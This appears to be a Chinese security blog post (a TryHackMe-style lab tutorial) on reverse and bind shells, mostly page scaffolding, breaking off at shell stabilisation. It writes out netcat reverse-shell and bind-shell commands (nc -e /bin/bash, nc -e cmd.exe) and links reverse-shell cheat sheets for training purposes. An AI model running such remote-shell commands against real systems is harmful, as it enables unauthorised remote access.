          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Metasploit/" itemprop="url">Metasploit</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Metasploit/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Metasploit</span></a></span></div></div><h1 class="post-title" itemprop="name headline">shell学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-24T02:06:10.722Z" title="发表于 2024-03-24 10:06:10">2024-03-24</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-05-03T08:55:14.616Z" title="更新于 2024-05-03 16:55:14">2024-05-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">11.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="shell学习"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/03/24/shell-xue-xi/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/03/24/shell-xue-xi/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/03/24/shell-xue-xi/"><header><a class="post-meta-categories" href="/categories/Metasploit/" itemprop="url">Metasploit</a><a href="/tags/Metasploit/" tabindex="-1" itemprop="url">Metasploit</a><h1 id="CrawlerTitle" itemprop="name headline">shell学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-03-24T02:06:10.722Z" title="发表于 2024-03-24 10:06:10">2024-03-24</time><time itemprop="dateCreated datePublished" datetime="2024-05-03T08:55:14.616Z" title="更新于 2024-05-03 16:55:14">2024-05-03</time></header><h1 id="0x01-什么是shell">0x01 什么是shell</h1>
<p>在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和 Powershell 也是shell。在针对远程系统时，有时可以强制应用程序在服务器上运行(例如 webserver)来执行任意代码，当这种情况发生时，我们希望使用这个初始访问来获得在目标上运行的 shell。</p>
<p>简单地说，我们可以强制远程服务器向我们发送对服务器的命令行访问(反向 shell) ，或者在服务器上打开一个端口，我们可以连接到这个端口以执行更多的命令(绑定 shell)。</p>
<p>我们将在整个房间中更详细地介绍这两种场景。</p>
<p>这个房间的格式如下：</p>
<ul>
<li>房间的大部分内容由信息组成，代码块和屏幕截图中给出了示例。</li>
<li>房间的最后两项任务中有两台虚拟机——一台是 Linux，一台是 Windows。这些可以用来练习所演示的技术。</li>
<li>任务 13 中有示例练习题。请随意完成这些练习，或者在完成任务时按照任务进行操作。</li>
</ul>
<p>话不多说，让我们开始吧！</p>
<h1 id="0x02-工具介绍">0x02 工具介绍</h1>
<p>我们将使用多种工具来接收反向 shell 和发送绑定 shell。一般来说，我们需要恶意的 shell 代码，以及与生成的 shell 进行接口的方法。我们将在下面简要讨论其中的每一项:</p>
<h2 id="netcat">Netcat</h2>
<p>Netcat 是传统的网络“瑞士军刀”。它用于手动执行各种网络交互，包括在枚举时抓取banner（横幅），更重要的是，它可以用于接收反向shell以及连接到远程端口以绑定目标系统上的shell。Netcat shells在默认情况下非常不稳定(容易丢失) ，但是我们可以通过一定技术来加以改进。</p>
<h2 id="socat">Socat</h2>
<p>Socat 就像升级版的 Netcat。它可以做和Netcat相同的事情，而且能够做更多。Socat shells 通常比开箱即用的 Netcat shells更稳定。从这个意义上说，它远远优于 netcat;</p>
<p>然而，Socat也有两个大的缺陷:</p>
<ol>
<li>Socat语法更加困难</li>
<li>在默认情况下，几乎每个 Linux 发行版都会安装Netcat，但很少会默认安装Socat</li>
</ol>
<blockquote>
<p>Netcat和Socat在 Windows 上都有.exe 版本</p>
</blockquote>
<h2 id="metasploit-multihandler">Metasploit – multi/handler</h2>
<p>Metasploit 框架的 auxiliary/multi/handler 模块与 socat 和 netcat 一样，可以用于接收反向 shell。由于是 Metasploit 框架的一部分，multi/handler 提供了一种获得稳定 shell 的完全成熟的方法，并提供了多种进一步改进所捕获的 shell 的选项。<br>
multi/handler模块是可以与 meterpreter shell 进行交互的方法，并且也是处理分段payload（有效载荷）的最简单方法。</p>
<h2 id="msfvenom">Msfvenom</h2>
<p>与multi/handler一样，msfvenom在技术上也是 Metasploit 框架的一部分，然而，它是作为一个独立的工具发布的。msfvenom用于动态生成payload，Msfvenom可以产生除了反向shell和绑定shell以外的其他payload（有效载荷）。</p>
<p>除了我们已经介绍过的工具之外，还有许多用不同编程语言书写的 关于shell利用的项目和资料，比如：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell <a target="_blank" rel="noopener" href="http://Cheatsheet.md">Cheatsheet.md</a></li>
<li><a target="_blank" rel="noopener" href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li>Kali Linux 预先安装了各种webshells，默认路径是：/usr/share/webshells</li>
<li>还有一个项目虽然主要是发挥字典功能，但是也包含了一些非常有用的 用于获取shell的代码：<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
</ol>
<h1 id="0x03-shell类型">0x03 shell类型</h1>
<p>从更高的层次上来说，当涉及到一个可利用目标时，我们只对两种 shell 感兴趣:</p>
<ol>
<li>反向 shell ，</li>
<li>绑定 shell。</li>
</ol>
<h2 id="reverse-shells反向shell">Reverse shells（反向shell）</h2>
<p>反向 shell 是指目标被迫执行一段代码 并以此连接到你的计算机，在你自己的计算机上，你可以使用前面提到的工具之一来设置一个用于接收连接的监听器。</p>
<p>反向 shell 是绕过防火墙规则的一个好方法，因为防火墙规则 可能会阻止你正向连接到目标上的任意端口；然而，有一个缺点是：当从互联网上的一台机器接收 shell 时，你需要先配置好你自己的网络。</p>
<h2 id="bind-shells绑定shell">Bind shells（绑定shell）</h2>
<p>当在目标上执行的代码用于启动一个直接连接到目标机器的shell的监听器时，就称为绑定 shell。然后，这将使目标向互联网开放，这意味着你可以连接到代码打开的端口，并通过这种方式获得远程代码执行。</p>
<p>这样做的好处是 不需要你在自己的网络上进行任何配置，但是该行为可能会被保护目标的防火墙加以阻止。</p>
<p><em>一般情况下，反向 shell 更容易执行和调试。</em></p>
<p><strong>反向shell的例子</strong></p>
<p>请看下面的图片。<br>
在左边，我们有一个反向 shell 侦听器——它接收连接，而右边是发送反向 shell 的模拟目标。实际上，这更可能是通过远程网站上的代码注入或类似的注入来完成的。<br>
把左边的图像想象成你自己的电脑，把右边的图像想象成你的目标。</p>
<pre><code class="hljs scss">#在攻击机（你的kali系统）上:
sudo nc -lvnp <span class="hljs-number">443</span>

#在目标机上：
nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash     #&lt;LOCAL-IP&gt; &lt;PORT&gt; 指的是攻击机上的ip和正在监听的端口</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104102689.png" alt="image-20240324104102689"></p>
<p>注意，在右边运行命令之后，左边的监听器将接收到一个连接，连接成功后，运行 whoami 命令，能看到我们能够作为目标用户去执行命令，重要的是：我们在监听我们自己的攻击机上的端口，由目标机发送连接到攻击机。</p>
<p><strong>绑定shell的例子</strong></p>
<p>绑定 shell 不太常见，但仍然非常有用。<br>
请看下面的图片。同样，左边是攻击者的电脑，右边是模拟目标。为了稍微改变一下，这次我们将使用 Windows 目标。</p>
<p>首先，我们在右边的目标上启动一个监听器–这一次，我们告诉它执行cmd.exe，然后，当目标机上的监听器启动并运行时，我们从自己的机器发送连接到目标机上新打开的端口</p>
<pre><code class="hljs scss">#在目标机上设置监听器，当监听器被触发时 执行cmd<span class="hljs-selector-class">.exe</span>程序：
nc -lvnp &lt;port&gt; -e "cmd<span class="hljs-selector-class">.exe</span>"

#在攻击机上发出连接请求：
nc MACHINE_IP &lt;port&gt;     <span class="hljs-selector-id">#MACHINE_IP</span> &lt;port&gt; 指的是目标机的ip和打开的端口</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240324104427246.png" alt="image-20240324104427246"></p>
<p>正如你所看到的，这再次为我们提供了在远程计算机上执行代码的机会。<br>
注意，这种情况不是 Windows 特有的，重要的是要明白，我们正在目标上开启监听器，然后用我们自己的机器主动去连接到它（目标）。</p>
<p>最后一个与本小节相关的概念是交互性。shell可以是交互式的，也可以是非交互式的。</p>
<p><strong>交互式shell</strong></p>
<p>如果你使用过 Powershell、 Bash、 Zsh、 sh 或任何其他标准的CLI（命令行）环境，那么你已经接触过交互式shell。<br>
交互式shell允许你在执行程序之后与它们发生交互。</p>
<p>例如，使用SSH登录:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20240324104654304.png" alt="image-20240324104654304"></p>
<p>在这里，你可以看到它以交互方式请求用户输入 yes 或 no 以继续进行登录连接。这是一个交互式程序，它需要一个交互式 shell 才能运行。</p>
<p><strong>非交互式shell</strong></p>
<p>非交互式shell 不会给你发生交互的机会。在非交互式shell中，只能使用不需要用户交互就能正常运行的程序。不幸的是，大多数简单的反向和绑定 shell 都是非交互式的，这可能会使进一步的漏洞利用变得更加棘手。</p>
<p>让我们看看在非交互式 shell 中运行 SSH 时会发生什么:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104750168.png" alt="image-20240324104750168"></p>
<p>由上图可以看到，whoami 命令(非交互式)执行得非常完美，但 ssh 命令(交互式)根本不会给我们任何输出。不过，有趣的是，交互式命令的输出确实可以到达某个地方。</p>
<p>可以说，交互式程序不能在非交互式 shell 中工作。此外，在截图中可以看到一个名为listener的命令，此命令是用于演示的攻击机器自定义的独有别名，是sudo rlwrap nc -lvnp 443 命令的速记方法。除非你在本地配置了这个别名，否则它不会在任何其他机器上工作。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104929187.png" alt="image-20240324104929187"></p>
<h1 id="0x04-netcat">0x04 Netcat</h1>
<h2 id="netcat建立反向shell">Netcat建立反向shell</h2>
<p>建立反向 shell 需要执行反向shell 代码以及设置监听器，执行 shellcode 的方法有很多，所以我们先从设置监听器开始。</p>
<p>使用 Linux 启动 netcat 监听器的语法如下:</p>
<pre><code class="hljs scss">nc -lvnp &lt;port-number&gt;

-l            #用来告诉netcat这将是一个监听器listener
-v            #用于请求详细输出
-n            #告诉netcat不要解析主机名或者使用DNS
-<span class="hljs-selector-tag">p</span>            #指定端口


<span class="hljs-selector-id">#netcat</span>常用参数列表：
-l：用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。
-<span class="hljs-selector-tag">p</span>：本地端口
-s：指定发送数据的源IP地址，适用于多网卡机 
-u：指定nc使用UDP协议，默认为TCP
-v：输出交互或出错信息，新手调试时尤为有用
-w：超时秒数，后面跟数字
-z：表示zero，表示扫描时不发送任何数据
-<span class="hljs-selector-tag">i</span>：secs 延时的间隔
-L：连接关闭，仍然继续监听
-n：指定数字ip，不能用hostname
-o：file 记录<span class="hljs-number">16</span>进制的传输
-r：随机本地及远程端口
-t：使用Telnet交互方式</code></pre>
<p>上一个小节中使用的端口是443。实际上，你可以使用任何你喜欢的端口，只要这个端口还没有被服务所占用。请注意：如果选择使用低于1024的端口，则在启动监听器时需要使用 sudo。使用一个众所周知的端口号(80、443或53)通常是一个好主意，因为这更有可能绕过目标的出站防火墙规则</p>
<p>例子：</p>
<pre><code class="hljs scss">sudo nc -lvnp <span class="hljs-number">443</span></code></pre>
<p>然后，我们可以使用任意数量的payload（有效载荷）连接到这个目标，具体情况取决于目标环境。</p>
<h2 id="netcat建立绑定shell">Netcat建立绑定shell</h2>
<p>如果我们希望在目标上获得绑定 shell，那么我们可以假设在目标机的选定端口上已经有一个监听器正在等待我们: 我们所需要做的就是使用攻击机主动连接到它。<br>
这句话的语法相对简单:</p>
<pre><code class="hljs scss">nc &lt;target-ip&gt; &lt;chosen-port&gt;  #攻击机发出连接到目标机</code></pre>
<p>在这里，我们使用 netcat 指定我们选择的目标机端口（目标机上的监听器正在监听的端口），以此建立到目标机的向外连接。（在本文后面的内容中，将会讲解如何使用netcat 在目标机上设置监听器）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105316573.png" alt="image-20240324105316573"></p>
<h1 id="0x05-shell的稳定化">0x05 shell的稳定化</h1>
<p>我们已经捕获或连接到一个 Netcat shell，接下来该做什么？（对shell进行稳定化处理）</p>
